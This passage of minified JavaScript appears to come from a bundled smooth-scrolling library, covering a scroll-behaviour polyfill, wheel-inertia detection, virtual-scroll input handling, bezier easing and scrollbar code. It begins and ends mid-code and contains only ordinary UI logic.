                  void 0 !== arguments[0] && (!0 !== c(arguments[0]) ? m.call(t, e.body, void 0 !== arguments[0].left ? ~~arguments[0].left : t.scrollX || t.pageXOffset, void 0 !== arguments[0].top ? ~~arguments[0].top : t.scrollY || t.pageYOffset) : s.scroll.call(t, void 0 !== arguments[0].left ? arguments[0].left : "object" !== n(arguments[0]) ? arguments[0] : t.scrollX || t.pageXOffset, void 0 !== arguments[0].top ? arguments[0].top : void 0 !== arguments[1] ? arguments[1] : t.scrollY || t.pageYOffset))
                }, t.scrollBy = function () {
                  void 0 !== arguments[0] && (c(arguments[0]) ? s.scrollBy.call(t, void 0 !== arguments[0].left ? arguments[0].left : "object" !== n(arguments[0]) ? arguments[0] : 0, void 0 !== arguments[0].top ? arguments[0].top : void 0 !== arguments[1] ? arguments[1] : 0) : m.call(t, e.body, ~~arguments[0].left + (t.scrollX || t.pageXOffset), ~~arguments[0].top + (t.scrollY || t.pageYOffset)))
                }, r.prototype.scroll = r.prototype.scrollTo = function () {
                  if (void 0 !== arguments[0])
                    if (!0 !== c(arguments[0])) {
                      var t = arguments[0].left,
                        e = arguments[0].top;
                      m.call(this, this, void 0 === t ? this.scrollLeft : ~~t, void 0 === e ? this.scrollTop : ~~e)
                    } else {
                      if ("number" == typeof arguments[0] && void 0 === arguments[1]) throw new SyntaxError("Value could not be converted");
                      s.elementScroll.call(this, void 0 !== arguments[0].left ? ~~arguments[0].left : "object" !== n(arguments[0]) ? ~~arguments[0] : this.scrollLeft, void 0 !== arguments[0].top ? ~~arguments[0].top : void 0 !== arguments[1] ? ~~arguments[1] : this.scrollTop)
                    }
                }, r.prototype.scrollBy = function () {
                  void 0 !== arguments[0] && (!0 !== c(arguments[0]) ? this.scroll({
                    left: ~~arguments[0].left + this.scrollLeft,
                    top: ~~arguments[0].top + this.scrollTop,
                    behavior: arguments[0].behavior
                  }) : s.elementScroll.call(this, void 0 !== arguments[0].left ? ~~arguments[0].left + this.scrollLeft : ~~arguments[0] + this.scrollLeft, void 0 !== arguments[0].top ? ~~arguments[0].top + this.scrollTop : ~~arguments[1] + this.scrollTop))
                }, r.prototype.scrollIntoView = function () {
                  if (!0 !== c(arguments[0])) {
                    var i = d(this),
                      n = i.getBoundingClientRect(),
                      r = this.getBoundingClientRect();
                    i !== e.body ? (m.call(this, i, i.scrollLeft + r.left - n.left, i.scrollTop + r.top - n.top), "fixed" !== t.getComputedStyle(i).position && t.scrollBy({
                      left: n.left,
                      top: n.top,
                      behavior: "smooth"
                    })) : t.scrollBy({
                      left: r.left,
                      top: r.top,
                      behavior: "smooth"
                    })
                  } else s.scrollIntoView.call(this, void 0 === arguments[0] || arguments[0])
                }
              }

              function l(t, e) {
                this.scrollLeft = t, this.scrollTop = e
              }

              function c(t) {
                if (null === t || "object" !== n(t) || void 0 === t.behavior || "auto" === t.behavior || "instant" === t.behavior) return !0;
                if ("object" === n(t) && "smooth" === t.behavior) return !1;
                throw new TypeError("behavior member of ScrollOptions " + t.behavior + " is not a valid value for enumeration ScrollBehavior.")
              }

              function h(t, e) {
                return "Y" === e ? t.clientHeight + a < t.scrollHeight : "X" === e ? t.clientWidth + a < t.scrollWidth : void 0
              }

              function u(e, i) {
                var n = t.getComputedStyle(e, null)["overflow" + i];
                return "auto" === n || "scroll" === n
              }

              function f(t) {
                var e = h(t, "Y") && u(t, "Y"),
                  i = h(t, "X") && u(t, "X");
                return e || i
              }

              function d(t) {
                for (; t !== e.body && !1 === f(t);) t = t.parentNode || t.host;
                return t
              }

              function p(e) {
                var i, n, r, s, a = (o() - e.startTime) / 468;
                s = a = a > 1 ? 1 : a, i = .5 * (1 - Math.cos(Math.PI * s)), n = e.startX + (e.x - e.startX) * i, r = e.startY + (e.y - e.startY) * i, e.method.call(e.scrollable, n, r), n === e.x && r === e.y || t.requestAnimationFrame(p.bind(t, e))
              }

              function m(i, n, r) {
                var a, c, h, u, f = o();
                i === e.body ? (a = t, c = t.scrollX || t.pageXOffset, h = t.scrollY || t.pageYOffset, u = s.scroll) : (a = i, c = i.scrollLeft, h = i.scrollTop, u = l), p({
                  scrollable: a,
                  method: u,
                  startTime: f,
                  startX: c,
                  startY: h,
                  x: n,
                  y: r
                })
              }
            }
          }
        })),
        E = (k.polyfill, function (t) {
          h(i, t);
          var e = m(i);

          function i() {
            var t, n = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return r(this, i), (t = e.call(this, n)).resetNativeScroll && (history.scrollRestoration && (history.scrollRestoration = "manual"), window.scrollTo(0, 0)), window.addEventListener("scroll", t.checkScroll, !1), void 0 === window.smoothscrollPolyfill && (window.smoothscrollPolyfill = k, window.smoothscrollPolyfill.polyfill()), t
          }
          return o(i, [{
            key: "init",
            value: function () {
              this.instance.scroll.y = window.pageYOffset, this.addElements(), this.detectElements(), v(u(i.prototype), "init", this).call(this)
            }
          }, {
            key: "checkScroll",
            value: function () {
              var t = this;
              v(u(i.prototype), "checkScroll", this).call(this), this.getDirection && this.addDirection(), this.getSpeed && (this.addSpeed(), this.speedTs = Date.now()), this.instance.scroll.y = window.pageYOffset, Object.entries(this.els).length && (this.hasScrollTicking || (requestAnimationFrame((function () {
                t.detectElements()
              })), this.hasScrollTicking = !0))
            }
          }, {
            key: "addDirection",
            value: function () {
              window.pageYOffset > this.instance.scroll.y ? "down" !== this.instance.direction && (this.instance.direction = "down") : window.pageYOffset < this.instance.scroll.y && "up" !== this.instance.direction && (this.instance.direction = "up")
            }
          }, {
            key: "addSpeed",
            value: function () {
              window.pageYOffset != this.instance.scroll.y ? this.instance.speed = (window.pageYOffset - this.instance.scroll.y) / Math.max(1, Date.now() - this.speedTs) : this.instance.speed = 0
            }
          }, {
            key: "resize",
            value: function () {
              Object.entries(this.els).length && (this.windowHeight = window.innerHeight, this.updateElements())
            }
          }, {
            key: "addElements",
            value: function () {
              var t = this;
              this.els = {}, this.el.querySelectorAll("[data-" + this.name + "]").forEach((function (e, i) {
                e.getBoundingClientRect();
                var n, r, s, o = e.dataset[t.name + "Class"] || t.class,
                  a = "string" == typeof e.dataset[t.name + "Id"] ? e.dataset[t.name + "Id"] : i,
                  l = "string" == typeof e.dataset[t.name + "Offset"] ? e.dataset[t.name + "Offset"].split(",") : t.offset,
                  c = e.dataset[t.name + "Repeat"],
                  h = e.dataset[t.name + "Call"],
                  u = e.dataset[t.name + "Target"],
                  f = (s = void 0 !== u ? document.querySelector("".concat(u)) : e).getBoundingClientRect();
                n = f.top + t.instance.scroll.y, r = f.left + t.instance.scroll.x;
                var d = n + s.offsetHeight,
                  p = r + s.offsetWidth;
                c = "false" != c && (null != c || t.repeat);
                var m = t.getRelativeOffset(l),
                  v = {
                    el: e,
                    targetEl: s,
                    id: a,
                    class: o,
                    top: n += m[0],
                    bottom: d -= m[1],
                    left: r,
                    right: p,
                    offset: l,
                    progress: 0,
                    repeat: c,
                    inView: !1,
                    call: h
                  };
                t.els[a] = v, e.classList.contains(o) && t.setInView(t.els[a], a)
              }))
            }
          }, {
            key: "updateElements",
            value: function () {
              var t = this;
              Object.entries(this.els).forEach((function (e) {
                var i = g(e, 2),
                  n = i[0],
                  r = i[1],
                  s = r.targetEl.getBoundingClientRect().top + t.instance.scroll.y,
                  o = s + r.targetEl.offsetHeight,
                  a = t.getRelativeOffset(r.offset);
                t.els[n].top = s + a[0], t.els[n].bottom = o - a[1]
              })), this.hasScrollTicking = !1
            }
          }, {
            key: "getRelativeOffset",
            value: function (t) {
              var e = [0, 0];
              if (t)
                for (var i = 0; i < t.length; i++) "string" == typeof t[i] ? t[i].includes("%") ? e[i] = parseInt(t[i].replace("%", "") * this.windowHeight / 100) : e[i] = parseInt(t[i]) : e[i] = t[i];
              return e
            }
          }, {
            key: "scrollTo",
            value: function (t) {
              var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
                i = parseInt(e.offset) || 0,
                n = !!e.callback && e.callback;
              if ("string" == typeof t) {
                if ("top" === t) t = this.html;
                else if ("bottom" === t) t = this.html.offsetHeight - window.innerHeight;
                else if (!(t = document.querySelector(t))) return
              } else if ("number" == typeof t) t = parseInt(t);
              else if (!t || !t.tagName) return void console.warn("`target` parameter is not valid");
              i = "number" != typeof t ? t.getBoundingClientRect().top + i + this.instance.scroll.y : t + i;
              var r = function () {
                return parseInt(window.pageYOffset) === parseInt(i)
              };
              if (n) {
                if (r()) return void n();
                var s = function t() {
                  r() && (window.removeEventListener("scroll", t), n())
                };
                window.addEventListener("scroll", s)
              }
              window.scrollTo({
                top: i,
                behavior: 0 === e.duration ? "auto" : "smooth"
              })
            }
          }, {
            key: "update",
            value: function () {
              this.addElements(), this.detectElements()
            }
          }, {
            key: "destroy",
            value: function () {
              v(u(i.prototype), "destroy", this).call(this), window.removeEventListener("scroll", this.checkScroll, !1)
            }
          }]), i
        }(x)),
        M = Object.getOwnPropertySymbols,
        O = Object.prototype.hasOwnProperty,
        A = Object.prototype.propertyIsEnumerable;

      function C(t) {
        if (null == t) throw new TypeError("Object.assign cannot be called with null or undefined");
        return Object(t)
      }
      var D = function () {
        try {
          if (!Object.assign) return !1;
          var t = new String("abc");
          if (t[5] = "de", "5" === Object.getOwnPropertyNames(t)[0]) return !1;
          for (var e = {}, i = 0; i < 10; i++) e["_" + String.fromCharCode(i)] = i;
          if ("0123456789" !== Object.getOwnPropertyNames(e).map((function (t) {
              return e[t]
            })).join("")) return !1;
          var n = {};
          return "abcdefghijklmnopqrst".split("").forEach((function (t) {
            n[t] = t
          })), "abcdefghijklmnopqrst" === Object.keys(Object.assign({}, n)).join("")
        } catch (t) {
          return !1
        }
      }() ? Object.assign : function (t, e) {
        for (var i, n, r = C(t), s = 1; s < arguments.length; s++) {
          for (var o in i = Object(arguments[s])) O.call(i, o) && (r[o] = i[o]);
          if (M) {
            n = M(i);
            for (var a = 0; a < n.length; a++) A.call(i, n[a]) && (r[n[a]] = i[n[a]])
          }
        }
        return r
      };

      function P() {}
      P.prototype = {
        on: function (t, e, i) {
          var n = this.e || (this.e = {});
          return (n[t] || (n[t] = [])).push({
            fn: e,
            ctx: i
          }), this
        },
        once: function (t, e, i) {
          var n = this;

          function r() {
            n.off(t, r), e.apply(i, arguments)
          }
          return r._ = e, this.on(t, r, i)
        },
        emit: function (t) {
          for (var e = [].slice.call(arguments, 1), i = ((this.e || (this.e = {}))[t] || []).slice(), n = 0, r = i.length; n < r; n++) i[n].fn.apply(i[n].ctx, e);
          return this
        },
        off: function (t, e) {
          var i = this.e || (this.e = {}),
            n = i[t],
            r = [];
          if (n && e)
            for (var s = 0, o = n.length; s < o; s++) n[s].fn !== e && n[s].fn._ !== e && r.push(n[s]);
          return r.length ? i[t] = r : delete i[t], this
        }
      };
      var L = P,
        R = S((function (t, e) {
          (function () {
            (null !== e ? e : this).Lethargy = function () {
              function t(t, e, i, n) {
                this.stability = null != t ? Math.abs(t) : 8, this.sensitivity = null != e ? 1 + Math.abs(e) : 100, this.tolerance = null != i ? 1 + Math.abs(i) : 1.1, this.delay = null != n ? n : 150, this.lastUpDeltas = function () {
                  var t, e, i;
                  for (i = [], t = 1, e = 2 * this.stability; 1 <= e ? t <= e : t >= e; 1 <= e ? t++ : t--) i.push(null);
                  return i
                }.call(this), this.lastDownDeltas = function () {
                  var t, e, i;
                  for (i = [], t = 1, e = 2 * this.stability; 1 <= e ? t <= e : t >= e; 1 <= e ? t++ : t--) i.push(null);
                  return i
                }.call(this), this.deltasTimestamp = function () {
                  var t, e, i;
                  for (i = [], t = 1, e = 2 * this.stability; 1 <= e ? t <= e : t >= e; 1 <= e ? t++ : t--) i.push(null);
                  return i
                }.call(this)
              }
              return t.prototype.check = function (t) {
                var e;
                return null != (t = t.originalEvent || t).wheelDelta ? e = t.wheelDelta : null != t.deltaY ? e = -40 * t.deltaY : null == t.detail && 0 !== t.detail || (e = -40 * t.detail), this.deltasTimestamp.push(Date.now()), this.deltasTimestamp.shift(), e > 0 ? (this.lastUpDeltas.push(e), this.lastUpDeltas.shift(), this.isInertia(1)) : (this.lastDownDeltas.push(e), this.lastDownDeltas.shift(), this.isInertia(-1))
              }, t.prototype.isInertia = function (t) {
                var e, i, n, r, s, o, a;
                return null === (e = -1 === t ? this.lastDownDeltas : this.lastUpDeltas)[0] ? t : !(this.deltasTimestamp[2 * this.stability - 2] + this.delay > Date.now() && e[0] === e[2 * this.stability - 1]) && (n = e.slice(0, this.stability), i = e.slice(this.stability, 2 * this.stability), a = n.reduce((function (t, e) {
                  return t + e
                })), s = i.reduce((function (t, e) {
                  return t + e
                })), o = a / n.length, r = s / i.length, Math.abs(o) < Math.abs(r * this.tolerance) && this.sensitivity < Math.abs(r) && t)
              }, t.prototype.showLastUpDeltas = function () {
                return this.lastUpDeltas
              }, t.prototype.showLastDownDeltas = function () {
                return this.lastDownDeltas
              }, t
            }()
          }).call(T)
        })),
        B = "onwheel" in document,
        I = "onmousewheel" in document,
        z = "ontouchstart" in window || window.TouchEvent || window.DocumentTouch && document instanceof DocumentTouch,
        Y = navigator.msMaxTouchPoints && navigator.msMaxTouchPoints > 1,
        F = !!window.navigator.msPointerEnabled,
        X = "onkeydown" in document,
        H = navigator.userAgent.indexOf("Firefox") > -1,
        j = Object.prototype.toString,
        W = Object.prototype.hasOwnProperty;

      function V(t, e) {
        return function () {
          return t.apply(e, arguments)
        }
      }
      var N = R.Lethargy,
        q = "virtualscroll",
        U = G;

      function G(t) {
        ! function (t) {
          if (!t) return console.warn("bindAll requires at least one argument.");
          var e = Array.prototype.slice.call(arguments, 1);
          if (0 === e.length)
            for (var i in t) W.call(t, i) && "function" == typeof t[i] && "[object Function]" == j.call(t[i]) && e.push(i);
          for (var n = 0; n < e.length; n++) {
            var r = e[n];
            t[r] = V(t[r], t)
          }
        }(this, "_onWheel", "_onMouseWheel", "_onTouchStart", "_onTouchMove", "_onKeyDown"), this.el = window, t && t.el && (this.el = t.el, delete t.el), this.options = D({
          mouseMultiplier: 1,
          touchMultiplier: 2,
          firefoxMultiplier: 15,
          keyStep: 120,
          preventTouch: !1,
          unpreventTouchClass: "vs-touchmove-allowed",
          limitInertia: !1,
          useKeyboard: !0,
          useTouch: !0
        }, t), this.options.limitInertia && (this._lethargy = new N), this._emitter = new L, this._event = {
          y: 0,
          x: 0,
          deltaX: 0,
          deltaY: 0
        }, this.touchStartX = null, this.touchStartY = null, this.bodyTouchAction = null, void 0 !== this.options.passive && (this.listenerOptions = {
          passive: this.options.passive
        })
      }

      function K(t, e, i) {
        return (1 - i) * t + i * e
      }

      function Z(t) {
        var e = {};
        if (window.getComputedStyle) {
          var i = getComputedStyle(t),
            n = i.transform || i.webkitTransform || i.mozTransform,
            r = n.match(/^matrix3d\((.+)\)$/);
          return r ? (e.x = r ? parseFloat(r[1].split(", ")[12]) : 0, e.y = r ? parseFloat(r[1].split(", ")[13]) : 0) : (r = n.match(/^matrix\((.+)\)$/), e.x = r ? parseFloat(r[1].split(", ")[4]) : 0, e.y = r ? parseFloat(r[1].split(", ")[5]) : 0), e
        }
      }

      function Q(t) {
        for (var e = []; t && t !== document; t = t.parentNode) e.push(t);
        return e
      }
      G.prototype._notify = function (t) {
        var e = this._event;
        e.x += e.deltaX, e.y += e.deltaY, this._emitter.emit(q, {
          x: e.x,
          y: e.y,
          deltaX: e.deltaX,
          deltaY: e.deltaY,
          originalEvent: t
        })
      }, G.prototype._onWheel = function (t) {
        var e = this.options;
        if (!this._lethargy || !1 !== this._lethargy.check(t)) {
          var i = this._event;
          i.deltaX = t.wheelDeltaX || -1 * t.deltaX, i.deltaY = t.wheelDeltaY || -1 * t.deltaY, H && 1 == t.deltaMode && (i.deltaX *= e.firefoxMultiplier, i.deltaY *= e.firefoxMultiplier), i.deltaX *= e.mouseMultiplier, i.deltaY *= e.mouseMultiplier, this._notify(t)
        }
      }, G.prototype._onMouseWheel = function (t) {
        if (!this.options.limitInertia || !1 !== this._lethargy.check(t)) {
          var e = this._event;
          e.deltaX = t.wheelDeltaX ? t.wheelDeltaX : 0, e.deltaY = t.wheelDeltaY ? t.wheelDeltaY : t.wheelDelta, this._notify(t)
        }
      }, G.prototype._onTouchStart = function (t) {
        var e = t.targetTouches ? t.targetTouches[0] : t;
        this.touchStartX = e.pageX, this.touchStartY = e.pageY
      }, G.prototype._onTouchMove = function (t) {
        var e = this.options;
        e.preventTouch && !t.target.classList.contains(e.unpreventTouchClass) && t.preventDefault();
        var i = this._event,
          n = t.targetTouches ? t.targetTouches[0] : t;
        i.deltaX = (n.pageX - this.touchStartX) * e.touchMultiplier, i.deltaY = (n.pageY - this.touchStartY) * e.touchMultiplier, this.touchStartX = n.pageX, this.touchStartY = n.pageY, this._notify(t)
      }, G.prototype._onKeyDown = function (t) {
        var e = this._event;
        e.deltaX = e.deltaY = 0;
        var i = window.innerHeight - 40;
        switch (t.keyCode) {
          case 37:
          case 38:
            e.deltaY = this.options.keyStep;
            break;
          case 39:
          case 40:
            e.deltaY = -this.options.keyStep;
            break;
          case t.shiftKey:
            e.deltaY = i;
            break;
          case 32:
            e.deltaY = -i;
            break;
          default:
            return
        }
        this._notify(t)
      }, G.prototype._bind = function () {
        B && this.el.addEventListener("wheel", this._onWheel, this.listenerOptions), I && this.el.addEventListener("mousewheel", this._onMouseWheel, this.listenerOptions), z && this.options.useTouch && (this.el.addEventListener("touchstart", this._onTouchStart, this.listenerOptions), this.el.addEventListener("touchmove", this._onTouchMove, this.listenerOptions)), F && Y && (this.bodyTouchAction = document.body.style.msTouchAction, document.body.style.msTouchAction = "none", this.el.addEventListener("MSPointerDown", this._onTouchStart, !0), this.el.addEventListener("MSPointerMove", this._onTouchMove, !0)), X && this.options.useKeyboard && document.addEventListener("keydown", this._onKeyDown)
      }, G.prototype._unbind = function () {
        B && this.el.removeEventListener("wheel", this._onWheel), I && this.el.removeEventListener("mousewheel", this._onMouseWheel), z && (this.el.removeEventListener("touchstart", this._onTouchStart), this.el.removeEventListener("touchmove", this._onTouchMove)), F && Y && (document.body.style.msTouchAction = this.bodyTouchAction, this.el.removeEventListener("MSPointerDown", this._onTouchStart, !0), this.el.removeEventListener("MSPointerMove", this._onTouchMove, !0)), X && this.options.useKeyboard && document.removeEventListener("keydown", this._onKeyDown)
      }, G.prototype.on = function (t, e) {
        this._emitter.on(q, t, e);
        var i = this._emitter.e;
        i && i[q] && 1 === i[q].length && this._bind()
      }, G.prototype.off = function (t, e) {
        this._emitter.off(q, t, e);
        var i = this._emitter.e;
        (!i[q] || i[q].length <= 0) && this._unbind()
      }, G.prototype.reset = function () {
        var t = this._event;
        t.x = 0, t.y = 0
      }, G.prototype.destroy = function () {
        this._emitter.off(), this._unbind()
      };
      var $ = .1,
        J = "function" == typeof Float32Array;

      function tt(t, e) {
        return 1 - 3 * e + 3 * t
      }

      function et(t, e) {
        return 3 * e - 6 * t
      }

      function it(t) {
        return 3 * t
      }

      function nt(t, e, i) {
        return ((tt(e, i) * t + et(e, i)) * t + it(e)) * t
      }

      function rt(t, e, i) {
        return 3 * tt(e, i) * t * t + 2 * et(e, i) * t + it(e)
      }

      function st(t) {
        return t
      }
      var ot = function (t, e, i, n) {
          if (!(0 <= t && t <= 1 && 0 <= i && i <= 1)) throw new Error("bezier x values must be in [0, 1] range");
          if (t === e && i === n) return st;
          for (var r = J ? new Float32Array(11) : new Array(11), s = 0; s < 11; ++s) r[s] = nt(s * $, t, i);
          return function (s) {
            return 0 === s ? 0 : 1 === s ? 1 : nt(function (e) {
              for (var n = 0, s = 1; 10 !== s && r[s] <= e; ++s) n += $;
              --s;
              var o = n + (e - r[s]) / (r[s + 1] - r[s]) * $,
                a = rt(o, t, i);
              return a >= .001 ? function (t, e, i, n) {
                for (var r = 0; r < 4; ++r) {
                  var s = rt(e, i, n);
                  if (0 === s) return e;
                  e -= (nt(e, i, n) - t) / s
                }
                return e
              }(e, o, t, i) : 0 === a ? o : function (t, e, i, n, r) {
                var s, o, a = 0;
                do {
                  (s = nt(o = e + (i - e) / 2, n, r) - t) > 0 ? i = o : e = o
                } while (Math.abs(s) > 1e-7 && ++a < 10);
                return o
              }(e, n, n + $, t, i)
            }(s), e, n)
          }
        },
        at = function (t) {
          h(i, t);
          var e = m(i);

          function i() {
            var t, n = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return r(this, i), history.scrollRestoration && (history.scrollRestoration = "manual"), window.scrollTo(0, 0), (t = e.call(this, n)).inertia && (t.lerp = .1 * t.inertia), t.isScrolling = !1, t.isDraggingScrollbar = !1, t.isTicking = !1, t.hasScrollTicking = !1, t.parallaxElements = {}, t.stop = !1, t.scrollbarContainer = n.scrollbarContainer, t.checkKey = t.checkKey.bind(d(t)), window.addEventListener("keydown", t.checkKey, !1), t
          }
          return o(i, [{
            key: "init",
            value: function () {
              var t = this;
              this.html.classList.add(this.smoothClass), this.html.setAttribute("data-".concat(this.name, "-direction"), this.direction), this.instance = c({
                delta: {
                  x: this.initPosition.x,
                  y: this.initPosition.y
                },
                scroll: {
                  x: this.initPosition.x,
                  y: this.initPosition.y
                }
              }, this.instance), this.vs = new U({
                el: this.scrollFromAnywhere ? document : this.el,
                mouseMultiplier: navigator.platform.indexOf("Win") > -1 ? 1 : .4,
                firefoxMultiplier: this.firefoxMultiplier,
                touchMultiplier: this.touchMultiplier,
                useKeyboard: !1,
                passive: !0
              }), this.vs.on((function (e) {
                t.stop || t.isDraggingScrollbar || requestAnimationFrame((function () {
                  t.updateDelta(e), t.isScrolling || t.startScrolling()
                }))
              })), this.setScrollLimit(), this.initScrollBar(), this.addSections(), this.addElements(), this.checkScroll(!0), this.transformElements(!0, !0), v(u(i.prototype), "init", this).call(this)
            }
          }, {
            key: "setScrollLimit",
            value: function () {
              if (this.instance.limit.y = this.el.offsetHeight - this.windowHeight, "horizontal" === this.direction) {
                for (var t = 0, e = this.el.children, i = 0; i < e.length; i++) t += e[i].offsetWidth;
                this.instance.limit.x = t - this.windowWidth
              }
            }
          }, {
            key: "startScrolling",
            value: function () {
              this.startScrollTs = Date.now(), this.isScrolling = !0, this.checkScroll(), this.html.classList.add(this.scrollingClass)
            }
          }, {
            key: "stopScrolling",
            value: function () {
              cancelAnimationFrame(this.checkScrollRaf), this.startScrollTs = void 0, this.scrollToRaf && (cancelAnimationFrame(this.scrollToRaf), this.scrollToRaf = null), this.isScrolling = !1, this.instance.scroll.y = Math.round(this.instance.scroll.y), this.html.classList.remove(this.scrollingClass)
            }
          }, {
            key: "checkKey",
            value: function (t) {
              var e = this;
              if (this.stop) 9 == t.keyCode && requestAnimationFrame((function () {
                e.html.scrollTop = 0, document.body.scrollTop = 0, e.html.scrollLeft = 0, document.body.scrollLeft = 0
              }));
              else {
                switch (t.keyCode) {
                  case 9:
                    requestAnimationFrame((function () {
                      e.html.scrollTop = 0, document.body.scrollTop = 0, e.html.scrollLeft = 0, document.body.scrollLeft = 0, e.scrollTo(document.activeElement, {
                        offset: -window.innerHeight / 2
                      })
                    }));
                    break;
                  case 38:
                    this.isActiveElementScrollSensitive() && (this.instance.delta[this.directionAxis] -= 240);
                    break;
                  case 40:
                    this.isActiveElementScrollSensitive() && (this.instance.delta[this.directionAxis] += 240);
                    break;
                  case 33:
                    this.instance.delta[this.directionAxis] -= window.innerHeight;
                    break;
                  case 34:
                    this.instance.delta[this.directionAxis] += window.innerHeight;
                    break;
                  case 36:
                    this.instance.delta[this.directionAxis] -= this.instance.limit[this.directionAxis];
                    break;
                  case 35:
                    this.instance.delta[this.directionAxis] += this.instance.limit[this.directionAxis];
                    break;
                  case 32:
                    this.isActiveElementScrollSensitive() && (t.shiftKey ? this.instance.delta[this.directionAxis] -= window.innerHeight : this.instance.delta[this.directionAxis] += window.innerHeight);
                    break;
                  default:
                    return
                }
                this.instance.delta[this.directionAxis] < 0 && (this.instance.delta[this.directionAxis] = 0), this.instance.delta[this.directionAxis] > this.instance.limit[this.directionAxis] && (this.instance.delta[this.directionAxis] = this.instance.limit[this.directionAxis]), this.stopScrolling(), this.isScrolling = !0, this.checkScroll(), this.html.classList.add(this.scrollingClass)
              }
            }
          }, {
            key: "isActiveElementScrollSensitive",
            value: function () {
              return !(document.activeElement instanceof HTMLInputElement || document.activeElement instanceof HTMLTextAreaElement || document.activeElement instanceof HTMLButtonElement || document.activeElement instanceof HTMLSelectElement)
            }
          }, {
            key: "checkScroll",
            value: function () {
              var t = this,
                e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
              if (e || this.isScrolling || this.isDraggingScrollbar) {
                this.hasScrollTicking || (this.checkScrollRaf = requestAnimationFrame((function () {
                  return t.checkScroll()
                })), this.hasScrollTicking = !0), this.updateScroll();
                var n = Math.abs(this.instance.delta[this.directionAxis] - this.instance.scroll[this.directionAxis]),
                  r = Date.now() - this.startScrollTs;
                if (!this.animatingScroll && r > 100 && (n < .5 && 0 != this.instance.delta[this.directionAxis] || n < .5 && 0 == this.instance.delta[this.directionAxis]) && this.stopScrolling(), Object.entries(this.sections).forEach((function (i) {
                    var n = g(i, 2),
                      r = (n[0], n[1]);
                    r.persistent || t.instance.scroll[t.directionAxis] > r.offset[t.directionAxis] && t.instance.scroll[t.directionAxis] < r.limit[t.directionAxis] ? ("horizontal" === t.direction ? t.transform(r.el, -t.instance.scroll[t.directionAxis], 0) : t.transform(r.el, 0, -t.instance.scroll[t.directionAxis]), r.inView || (r.inView = !0, r.el.style.opacity = 1, r.el.style.pointerEvents = "all", r.el.setAttribute("data-".concat(t.name, "-section-inview"), ""))) : ((r.inView || e) && (r.inView = !1, r.el.style.opacity = 0, r.el.style.pointerEvents = "none", r.el.removeAttribute("data-".concat(t.name, "-section-inview"))), t.transform(r.el, 0, 0))
                  })), this.getDirection && this.addDirection(), this.getSpeed && (this.addSpeed(), this.speedTs = Date.now()), this.detectElements(), this.transformElements(), this.hasScrollbar) {
                  var s = this.instance.scroll[this.directionAxis] / this.instance.limit[this.directionAxis] * this.scrollBarLimit[this.directionAxis];
                  "horizontal" === this.direction ? this.transform(this.scrollbarThumb, s, 0) : this.transform(this.scrollbarThumb, 0, s)
                }
                v(u(i.prototype), "checkScroll", this).call(this), this.hasScrollTicking = !1
              }
            }
          }, {
            key: "resize",
            value: function () {
              this.windowHeight = window.innerHeight, this.windowWidth = window.innerWidth, this.checkContext(), this.windowMiddle = {
                x: this.windowWidth / 2,
                y: this.windowHeight / 2
              }, this.update()
            }
          }, {
            key: "updateDelta",
            value: function (t) {
              var e, i = this[this.context] && this[this.context].gestureDirection ? this[this.context].gestureDirection : this.gestureDirection;
              e = "both" === i ? t.deltaX + t.deltaY : "vertical" === i ? t.deltaY : "horizontal" === i ? t.deltaX : t.deltaY, this.instance.delta[this.directionAxis] -= e * this.multiplier, this.instance.delta[this.directionAxis] < 0 && (this.instance.delta[this.directionAxis] = 0), this.instance.delta[this.directionAxis] > this.instance.limit[this.directionAxis] && (this.instance.delta[this.directionAxis] = this.instance.limit[this.directionAxis])
            }
          }, {
            key: "updateScroll",
            value: function (t) {
              this.isScrolling || this.isDraggingScrollbar ? this.instance.scroll[this.directionAxis] = K(this.instance.scroll[this.directionAxis], this.instance.delta[this.directionAxis], this.lerp) : this.instance.scroll[this.directionAxis] > this.instance.limit[this.directionAxis] ? this.setScroll(this.instance.scroll[this.directionAxis], this.instance.limit[this.directionAxis]) : this.instance.scroll.y < 0 ? this.setScroll(this.instance.scroll[this.directionAxis], 0) : this.setScroll(this.instance.scroll[this.directionAxis], this.instance.delta[this.directionAxis])
            }
          }, {
            key: "addDirection",
            value: function () {
              this.instance.delta.y > this.instance.scroll.y ? "down" !== this.instance.direction && (this.instance.direction = "down") : this.instance.delta.y < this.instance.scroll.y && "up" !== this.instance.direction && (this.instance.direction = "up"), this.instance.delta.x > this.instance.scroll.x ? "right" !== this.instance.direction && (this.instance.direction = "right") : this.instance.delta.x < this.instance.scroll.x && "left" !== this.instance.direction && (this.instance.direction = "left")
            }
          }, {
            key: "addSpeed",
            value: function () {
              this.instance.delta[this.directionAxis] != this.instance.scroll[this.directionAxis] ? this.instance.speed = (this.instance.delta[this.directionAxis] - this.instance.scroll[this.directionAxis]) / Math.max(1, Date.now() - this.speedTs) : this.instance.speed = 0
            }
          }, {
            key: "initScrollBar",
            value: function () {
              if (this.scrollbar = document.createElement("span"), this.scrollbarThumb = document.createElement("span"), this.scrollbar.classList.add("".concat(this.scrollbarClass)), this.scrollbarThumb.classList.add("".concat(this.scrollbarClass, "_thumb")), this.scrollbar.append(this.scrollbarThumb), this.scrollbarContainer ? this.scrollbarContainer.append(this.scrollbar) : document.body.append(this.scrollbar), this.getScrollBar = this.getScrollBar.bind(this), this.releaseScrollBar = this.releaseScrollBar.bind(this), this.moveScrollBar = this.moveScrollBar.bind(this), this.scrollbarThumb.addEventListener("mousedown", this.getScrollBar), window.addEventListener("mouseup", this.releaseScrollBar), window.addEventListener("mousemove", this.moveScrollBar), this.hasScrollbar = !1, "horizontal" == this.direction) {
                if (this.instance.limit.x + this.windowWidth <= this.windowWidth) return
              } else if (this.instance.limit.y + this.windowHeight <= this.windowHeight) return;
              this.hasScrollbar = !0, this.scrollbarBCR = this.scrollbar.getBoundingClientRect(), this.scrollbarHeight = this.scrollbarBCR.height, this.scrollbarWidth = this.scrollbarBCR.width, "horizontal" === this.direction ? this.scrollbarThumb.style.width = "".concat(this.scrollbarWidth * this.scrollbarWidth / (this.instance.limit.x + this.scrollbarWidth), "px") : this.scrollbarThumb.style.height = "".concat(this.scrollbarHeight * this.scrollbarHeight / (this.instance.limit.y + this.scrollbarHeight), "px"), this.scrollbarThumbBCR = this.scrollbarThumb.getBoundingClientRect(), this.scrollBarLimit = {
                x: this.scrollbarWidth - this.scrollbarThumbBCR.width,
                y: this.scrollbarHeight - this.scrollbarThumbBCR.height
